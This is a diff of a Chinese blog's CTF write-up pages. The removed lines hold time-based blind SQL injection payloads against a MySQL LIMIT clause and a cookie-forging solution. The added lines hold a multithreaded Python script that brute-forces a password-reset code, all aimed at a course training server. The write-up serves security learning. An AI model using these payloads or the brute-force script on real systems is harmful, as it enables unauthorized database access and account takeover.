@@ -3,17 +3,17 @@
 <head>
   <meta charset="utf-8">
   
-  <title>hduisa_ctf_week2_writeup | Edward_L&#39;s Blog</title>
+  <title>hduisa_ctf_week5_writeup | Edward_L&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Problem ID:7颇有技巧的SQL注入真的是一题让我学到了很多的题目啊。一步一步来，首先为了做这道题，我查看了大概一下的资料：SQL Injections in MySQL LIMIT clauseMySQL Injection Quick ReferenceSQLi Labs 指南 Part 1SQLi Labs 指南 Part 2hint">
+  <meta name="description" content="Problem ID:17EasyUser一看就是一个爆破验证码的题目，然后就开始写脚本">
 <meta property="og:type" content="article">
-<meta property="og:title" content="hduisa_ctf_week2_writeup">
-<meta property="og:url" content="http://edward-l.github.io/2015/02/06/hduisa_ctf_week2_writeup/index.html">
+<meta property="og:title" content="hduisa_ctf_week5_writeup">
+<meta property="og:url" content="http://edward-l.github.io/2015/03/16/hduisa_ctf_week5_writeup/index.html">
 <meta property="og:site_name" content="Edward_L's Blog">
-<meta property="og:description" content="Problem ID:7颇有技巧的SQL注入真的是一题让我学到了很多的题目啊。一步一步来，首先为了做这道题，我查看了大概一下的资料：SQL Injections in MySQL LIMIT clauseMySQL Injection Quick ReferenceSQLi Labs 指南 Part 1SQLi Labs 指南 Part 2hint">
+<meta property="og:description" content="Problem ID:17EasyUser一看就是一个爆破验证码的题目，然后就开始写脚本">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="hduisa_ctf_week2_writeup">
-<meta name="twitter:description" content="Problem ID:7颇有技巧的SQL注入真的是一题让我学到了很多的题目啊。一步一步来，首先为了做这道题，我查看了大概一下的资料：SQL Injections in MySQL LIMIT clauseMySQL Injection Quick ReferenceSQLi Labs 指南 Part 1SQLi Labs 指南 Part 2hint">
+<meta name="twitter:title" content="hduisa_ctf_week5_writeup">
+<meta name="twitter:description" content="Problem ID:17EasyUser一看就是一个爆破验证码的题目，然后就开始写脚本">
   
   
     <link rel="icon" href="/favicon.png">
@@ -80,10 +80,10 @@ ga('send', 'pageview');
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-hduisa_ctf_week2_writeup" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-hduisa_ctf_week5_writeup" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2015/02/06/hduisa_ctf_week2_writeup/" class="article-date">
-  <time datetime="2015-02-05T18:30:16.000Z" itemprop="datePublished">Feb 6 2015</time>
+    <a href="/2015/03/16/hduisa_ctf_week5_writeup/" class="article-date">
+  <time datetime="2015-03-16T02:30:16.000Z" itemprop="datePublished">Mar 16 2015</time>
 </a>
     
   <div class="article-category">
@@ -98,7 +98,7 @@ ga('send', 'pageview');
         
   
     <h1 class="article-title" itemprop="name">
-      hduisa_ctf_week2_writeup
+      hduisa_ctf_week5_writeup
     </h1>
   
 
@@ -106,29 +106,22 @@ ga('send', 'pageview');
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Problem_ID:7">Problem ID:7</h3><h3 id="颇有技巧的SQL注入">颇有技巧的SQL注入</h3><p>真的是一题让我学到了很多的题目啊。一步一步来，首先为了做这道题，我查看了大概一下的资料：<br><a href="http://www.edwardl.xyz/2015/02/06/SQL%20Injections%20in%20MySQL%20LIMIT%20clause/" target="_blank" rel="external">SQL Injections in MySQL LIMIT clause</a><br><a href="http://lightless.me/archives/MySQL-Injection-Quick-Reference.html" target="_blank" rel="external">MySQL Injection Quick Reference</a><br><a href="http://www.freebuf.com/articles/web/34619.html" target="_blank" rel="external">SQLi Labs 指南 Part 1</a><br><a href="http://www.freebuf.com/articles/web/38315.html" target="_blank" rel="external">SQLi Labs 指南 Part 2</a><br><a href="http://lightless.me/archives/Limit-Injection-Writeup.html" target="_blank" rel="external">hint</a><br><a id="more"></a><br>大概总结下就是一般的步骤为：<br>1.爆数据库的个数<br>2.爆数据库的名字<br>3.爆表的个数<br>4.爆表的名字<br>5.爆表的字段数<br>6.爆表的字段名<br>7.爆表中的内容<br>然后我就开始从hint出发，开始构造payload。开始看了下hint中给出的两个payload，一个是爆数据库的个数的，一个是爆数据库的名字的，但是做到后来才发现，其实这两步在这个题中也不是十分必要的，因为，这道题我们已经在这个数据库中了，后来的payload中不用到数据库的名字也是可以的。然后就是爆表的各个部分了，一开始看了下表的个数，<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(TABLE_NAME) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">TABLES</span> <span class="keyword">WHERE</span> TABLE_SCHEMA = <span class="keyword">DATABASE</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>接下来就是爆表的名字了<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(table_name <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">TABLES</span> <span class="keyword">WHERE</span> TABLE_SCHEMA = <span class="keyword">DATABASE</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>然后是表的字段数<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(<span class="keyword">COUNT</span>(*) <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">WHERE</span> TABLE_NAME=<span class="number">0x666C6167</span> <span class="keyword">AND</span> TABLE_SCHEMA = <span class="keyword">DATABASE</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>然后是爆表的字段名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(COLUMN_NAME <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> INFORMATION_SCHEMA.<span class="keyword">COLUMNS</span> <span class="keyword">WHERE</span> TABLE_NAME=<span class="number">0x666C6167</span> <span class="keyword">AND</span> TABLE_SCHEMA = <span class="keyword">DATABASE</span>() <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>最后就是爆表的内容<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://104.236.171.163/week2/limit/?l=1 PROCEDURE analyse((<span class="operator"><span class="keyword">select</span> extractvalue(<span class="keyword">rand</span>(),<span class="keyword">concat</span>(<span class="number">0x3a</span>,(<span class="keyword">IF</span>(<span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span>(<span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(ctf_limit_flag <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)) <span class="keyword">FROM</span> flag <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">99</span> , <span class="keyword">BENCHMARK</span>(<span class="number">5000000</span>,<span class="keyword">SHA1</span>(<span class="number">1</span>)),<span class="number">1</span>))))),<span class="number">1</span>);</span></span><br></pre></td></tr></table></figure></p>
-<p>最后得到flag。</p>
-<h3 id="Problem_ID:8">Problem ID:8</h3><h3 id="简单的题目">简单的题目</h3><p>根据题目描述， <code>GET ID = FLAG！</code>,尝试提交一个get表单，｀ID=FLAG`,构造URL，得到flag。</p>
-<h3 id="Problem_ID:9">Problem ID:9</h3><h3 id="基础训练">基础训练</h3><p>查看饼干，发现有个饼干是这样的<code>flag=bGlnaHRsZXNzOjQ3NmExMGYxZjNkZGU1MWQxYjUyMjY3YzFhY2NjMzll</code>应该是主要考加密解密的，base64解一下，得到<code>lightless:476a10f1f3dde51d1b52267c1accc39e</code>,应该是<code>名字：md5(名字)</code>的模式，根据首页的提示，<code>要用我名字的罗马音哦~</code>，逆向的进行一步一步加密，<code>Tobiichi Origami:097b235243b09755b3f586f201e8da8d</code>然后得到<code>VG9iaWljaGkgT3JpZ2FtaTowOTdiMjM1MjQzYjA5NzU1YjNmNTg2ZjIwMWU4ZGE4ZA==</code>，用这个换掉原来的饼干，done！</p>
-<p>week2的题目后面两道，虽然有一点点小失误（有一题base64转码的过程中，把空格进行了URL编码，导致一直不对但是后来想到了就秒了），但基本上还算是秒掉的。但是第一题确实是比较困难的，做的过程中看了很多资料，也增加了自己的很多知识，弥补了很多的不足。挺好的。训练还是有用的。<br>期待week3！</p>
+        <h3 id="Problem_ID:17">Problem ID:17</h3><h3 id="EasyUser">EasyUser</h3><p>一看就是一个爆破验证码的题目，然后就开始写脚本<br><a id="more"></a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib    </span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> re </span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(x,y)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> flag</span><br><span class="line">	<span class="keyword">if</span> flag == <span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(x,y):</span><br><span class="line">		url = <span class="string">'http://104.236.171.163/week5/easyuser/forget.php'</span>    </span><br><span class="line">		values = &#123;<span class="string">'number'</span> : i&#125;    </span><br><span class="line">		data = urllib.urlencode(values)  </span><br><span class="line">		req = urllib2.Request(url, data)  </span><br><span class="line">		response = urllib2.urlopen(req)</span><br><span class="line">		html = response.read()</span><br><span class="line">	<span class="comment">#	print html</span></span><br><span class="line">		match = re.match(<span class="string">r'.*10.*'</span>, html, re.S)</span><br><span class="line">		<span class="keyword">if</span>  match:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'%d is not psd'</span> %i</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">'%d is the psd'</span> %i</span><br><span class="line">			flag  = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="comment">#	print html</span></span><br><span class="line">	<span class="comment">#	print match</span></span><br><span class="line">		<span class="keyword">print</span> <span class="string">"current has %d threads"</span> % (threading.activeCount() - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> flag</span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line">t1 = threading.Thread(target = run, args = (<span class="number">500000</span>,<span class="number">600000</span>))</span><br><span class="line">t2 = threading.Thread(target = run, args = (<span class="number">600000</span>,<span class="number">700000</span>))</span><br><span class="line">t3 = threading.Thread(target = run, args = (<span class="number">700000</span>,<span class="number">800000</span>))</span><br><span class="line">t4 = threading.Thread(target = run, args = (<span class="number">800000</span>,<span class="number">900000</span>))</span><br><span class="line">t5 = threading.Thread(target = run, args = (<span class="number">900000</span>,<span class="number">1000000</span>))</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line">t3.start()</span><br><span class="line">t4.start()</span><br><span class="line">t5.start()</span><br><span class="line"><span class="comment"># for i in range(5):</span></span><br><span class="line"><span class="comment"># 	t3 = threading.Thread(target = run, args=(500000,600000))</span></span><br><span class="line"><span class="comment"># 	t3.start()</span></span><br></pre></td></tr></table></figure>
 
       
     </div>
     <footer class="article-footer">
       
-        <a data-url="http://edward-l.github.io/2015/02/06/hduisa_ctf_week2_writeup/" data-id="ci7b9u4cv003ml7tsq722kwwp" class="article-share-link" data-share="baidu">分享到</a>
+        <a data-url="http://edward-l.github.io/2015/03/16/hduisa_ctf_week5_writeup/" data-id="ci7b9u4ct003gl7tsrh8ueu2p" class="article-share-link" data-share="baidu">分享到</a>
       
 
       
-        <a href="http://edward-l.github.io/2015/02/06/hduisa_ctf_week2_writeup/#ds-thread" class="article-comment-link">Comments</a>
+        <a href="http://edward-l.github.io/2015/03/16/hduisa_ctf_week5_writeup/#ds-thread" class="article-comment-link">Comments</a>
       
 
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hduisa-ctf/">hduisa_ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/limit注入/">limit注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql-injection/">sql_injection</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hduisa-ctf/">hduisa_ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/threading/">threading</a></li></ul>
 
     </footer>
   </div>
@@ -136,19 +129,10 @@ ga('send', 'pageview');
     
 <nav id="article-nav">
   
-    <a href="/2015/03/13/raspbian pi 配置&技巧/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          raspbian pi 配置&amp;技巧
-        
-      </div>
-    </a>
   
-  
-    <a href="/2015/02/06/SQL Injections in MySQL LIMIT clause/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2015/03/14/hexo 安装&配置/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">SQL Injections in MySQL LIMIT clause</div>
+      <div class="article-nav-title">hexo 安装&amp;配置</div>
     </a>
   
 </nav>
@@ -157,7 +141,7 @@ ga('send', 'pageview');
 </article>
 
   <section id="comments">
-    <div id="ds-thread" class="ds-thread" data-thread-key="2015/02/06/hduisa_ctf_week2_writeup/" data-title="hduisa_ctf_week2_writeup" data-url="http://edward-l.github.io/2015/02/06/hduisa_ctf_week2_writeup/"></div>
+    <div id="ds-thread" class="ds-thread" data-thread-key="2015/03/16/hduisa_ctf_week5_writeup/" data-title="hduisa_ctf_week5_writeup" data-url="http://edward-l.github.io/2015/03/16/hduisa_ctf_week5_writeup/"></div>
   </section>
 </section>
         
